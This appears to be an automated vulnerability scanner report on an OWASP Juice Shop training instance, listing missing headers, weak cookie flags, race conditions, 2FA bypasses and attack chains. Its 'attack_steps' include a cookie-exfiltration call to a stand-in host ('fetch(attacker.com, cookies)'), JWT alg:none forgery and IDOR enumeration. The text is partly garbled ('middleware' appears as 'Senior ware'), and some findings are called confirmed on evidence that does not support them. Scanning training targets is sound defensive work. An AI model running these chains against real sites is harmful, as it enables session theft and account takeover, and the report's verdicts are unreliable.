security_headers.Strict-Transport-Security: ❌ MISSING — Protects against MITM / protocol downgrade

findings.detail: Server returns Access-Control-Allow-Origin: * — any origin can read responses.
findings.remediation: Restrict ACAO to a specific trusted origin. Never use wildcard when credentials are involved.

findings.detail: CSP prevents XSS and data injection attacks by controlling allowed resource sources.
findings.remediation: Add a strict CSP: 'default-src \'self\'; script-src \'self\'; object-src \'none\';'

findings.detail: HSTS forces HTTPS connections and prevents SSL-stripping attacks.
findings.remediation: Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

findings.detail: Missing Referrer-Policy may leak sensitive URL information to third parties.
findings.remediation: Add: Referrer-Policy: strict-origin-when-cross-origin

findings.detail: Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).
findings.remediation: Add: Permissions-Policy: geolocation=(), camera=(), microphone=()

findings.detail: Missing COOP allows cross-origin pages to access window references.
findings.remediation: Add: Cross-Origin-Opener-Policy: same-origin

findings.detail: Missing CORP allows cross-origin pages to load this site's resources.
findings.remediation: Add: Cross-Origin-Resource-Policy: same-origin

findings.detail: Cookie 'ApplicationGatewayAffinityCORS' lacks HttpOnly flag — readable by JavaScript, enabling XSS-based session theft.
findings.remediation: Set HttpOnly attribute: Set-Cookie: ApplicationGatewayAffinityCORS=...; HttpOnly

findings.detail: Possible base64-encoded data detected in cookie 'ApplicationGatewayAffinityCORS' value.
findings.remediation: Never store sensitive data directly in cookie values. Use server-side sessions.

findings.detail: Cookie 'ApplicationGatewayAffinity' lacks HttpOnly flag — readable by JavaScript, enabling XSS-based session theft.
findings.remediation: Set HttpOnly attribute: Set-Cookie: ApplicationGatewayAffinity=...; HttpOnly

findings.detail: Cookie 'ApplicationGatewayAffinity' lacks Secure flag — transmitted over HTTP, vulnerable to interception.
findings.remediation: Set Secure attribute: Set-Cookie: ApplicationGatewayAffinity=...; Secure

findings.detail: Cookie 'ApplicationGatewayAffinity' has no SameSite attribute — CSRF attacks may succeed.
findings.remediation: Add SameSite=Lax or SameSite=Strict: Set-Cookie: ApplicationGatewayAffinity=...; SameSite=Strict

findings.detail: Possible base64-encoded data detected in cookie 'ApplicationGatewayAffinity' value.
findings.remediation: Never store sensitive data directly in cookie values. Use server-side sessions.

findings.detail: Admin dashboard at https://juiceshop.akto.io/#/admin is directly accessible without login
findings.evidence: HTTP 200 | Dashboard indicators present without authentication
findings.remediation: Enforce authentication Senior ware on all admin routes. Use IP allowlisting for admin access if possible.

findings.detail: Dangerous sink 'setTimeout' received user-controllable data.
findings.remediation: Never pass unsanitized input to setTimeout.

findings.detail: Dangerous sink 'setInterval' received user-controllable data.
findings.remediation: Never pass unsanitized input to setInterval.

findings.detail: Password found in JavaScript file.
findings.remediation: Remove secrets from client-side JS. Use server-side environment variables.

findings.detail: Dangerous sink 'setTimeout' received user-controllable data.
findings.remediation: Never pass unsanitized input to setTimeout.

findings.detail: Password found in JavaScript file.
findings.remediation: Remove secrets from client-side JS. Use server-side environment variables.

findings.type: Recon — Discovered API Endpoints in JS
findings.detail: Found 20 API endpoints via JS analysis.
findings.remediation: Ensure all discovered endpoints require authentication.

findings.detail: Observed 27 XHR/fetch calls during crawl.
findings.remediation: Review all API calls for missing authentication.

findings.type: Business Logic — Race Condition (Double Spend / Duplicate Redemption)
findings.detail: 15/15 concurrent requests to /api/coupon/apply succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.
findings.remediation: Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields.

findings.type: Business Logic — Race Condition (Double Spend / Duplicate Redemption)
findings.detail: 15/15 concurrent requests to /api/withdraw succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.
findings.remediation: Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields.

findings.type: Business Logic — Race Condition (Double Spend / Duplicate Redemption)
findings.detail: 15/15 concurrent requests to /api/transfer succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.
findings.remediation: Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields.

findings.type: Business Logic — Race Condition (Double Spend / Duplicate Redemption)
findings.detail: 15/15 concurrent requests to /api/redeem succeeded. Race condition may allow double-spending, duplicate coupon use, or balance manipulation.
findings.remediation: Use database-level locking (SELECT FOR UPDATE). Implement idempotency keys. Use optimistic concurrency with version fields.

findings.detail: XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.
findings.remediation: Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.
findings.exploit_chain: XSS → Cookie Theft → Session Hijack → Account Takeover

findings.remediation: CRITICAL: Sanitize all shell inputs. Use subprocess with argument lists. Restrict OS command access from web layer.

findings.detail: No 2FA/MFA endpoint detected.
findings.evidence: None of common OTP paths returned OTP form.
findings.remediation: Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts.

findings.type: 2FA — No Rate Limiting on OTP (Brute-force Possible)
findings.detail: Tested 7 OTP codes with no lockout or 429 response.
findings.remediation: Enforce max 5 attempts. Add exponential backoff and account lockout.

findings.detail: Protected page '/dashboard' accessible without 2FA completion.
findings.remediation: Enforce 2FA completion check on ALL protected routes via Senior ware.

findings.detail: Setting cookie mfa_verified=true bypasses 2FA entirely.
findings.remediation: Store 2FA state server-side in session, not in cookies.

findings.detail: Forged 'remember_me=1' cookie bypasses 2FA for trusted device.
findings.remediation: Bind trusted device tokens to user+device fingerprint server-side. Sign tokens.

findings.detail: OAuth/SSO endpoint at '/auth/google' may log users in without 2FA. Social login commonly bypasses MFA if not explicitly enforced.
findings.remediation: Enforce 2FA for OAuth-authenticated users. Check MFA status post-OAuth login.

findings.detail: XSS allows attacker to steal CSRF tokens from victim's browser DOM, then forge authenticated state-changing requests (password reset, email change) without victim's knowledge — leading to full account takeover.
findings.evidence:
Step 1: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io/#
Step 2: [Cookie Missing SameSite: ApplicationGatewayAffinity] at https://juiceshop.akto.io/#
findings.remediation: Implement strict CSP (Content-Security-Policy). Use SameSite=Strict cookies. Enforce CSRF tokens even when XSS is patched (defense in depth).
findings.attack_steps: XSS → Steal CSRF Token → Forge Request → Change Email/Password → Account Takeover

findings.type: CHAIN: CORS Misconfiguration → XSS → Session Theft
findings.detail: Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.
findings.evidence:
Step 1: [CORS Wildcard Origin] at https://juiceshop.akto.io/#
Step 2: [Missing Header: Content-Security-Policy] at https://juiceshop.akto.io/#
findings.remediation: Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.
findings.attack_steps: CORS * → XSS on trusted subdomain → fetch(attacker.com, cookies) → Session Steal

findings.type: CHAIN: IDOR → PII Exfiltration → Mass Account Hijack
findings.detail: Insecure Direct Object References allow attackers to enumerate user IDs and access other users' data (emails, addresses, payment info). At scale, this enables mass PII exfiltration and account takeover.
findings.evidence:
Step 1: [Unauthenticated Admin Access] at https://juiceshop.akto.io/#/admin
Step 2: [Secret Leakage in JS — Password] at https://juiceshop.akto.io/main.js
findings.remediation: Implement authorization checks on every resource access. Use UUID instead of sequential IDs. Log and alert on anomalous data access patterns.
findings.attack_steps: IDOR /api/user/1 → iterate IDs → dump all emails → credential stuffing → mass takeover

findings.type: CHAIN: JWT None Algorithm → Admin Privilege Escalation
findings.detail: JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.
findings.evidence:
Step 1: [XSS — Session Hijack Payload (Generated)] at https://juiceshop.akto.io/#
Step 2: [Unauthenticated Admin Access] at https://juiceshop.akto.io/#/admin
findings.remediation: Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.
findings.attack_steps: JWT alg:none → Forge {role:admin} → Access admin panel → Full privilege escalation

findings.type: IDOR — Confirmed: Unauthenticated Access to Private Resource
findings.detail: '/api/user/1' returns identical content to both authenticated and unauthenticated sessions. PII fields: []
findings.evidence:
Auth hash == Anon hash (74b9c72be0ef880e9d8e2713d3be4b51). Preview: <!--
  ~ Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX-License-Identifier: MIT
  -->

<!doctype html>
<html l
findings.remediation: Implement authorization Senior ware on every endpoint. Verify that the requesting user owns the requested object. Return 401/403 for unauthenticated access.

findings.detail: HTTP PATCH on /api/order/1 succeeded without authorization.

findings.type: Web Cache Deception — Sensitive Path Cacheable
findings.detail: Authenticated path '/profile' is accessible as '/fake.css' and may be cached. An attacker can trick authenticated users to visit this URL, caching their private data for unauthenticated retrieval.
findings.remediation: Set Cache-Control: no-store on all authenticated responses. Configure CDN to not cache URLs matching authenticated paths. Validate request path ends with expected extension.

findings.type: SAML — Replay Attack Possible (No Assertion ID Tracking)
findings.detail: The same SAMLResponse was accepted twice. SAML Assertion ID is not tracked — replay attacks possible.
findings.remediation: Track and reject previously seen SAML Assertion IDs. Enforce NotOnOrAfter.
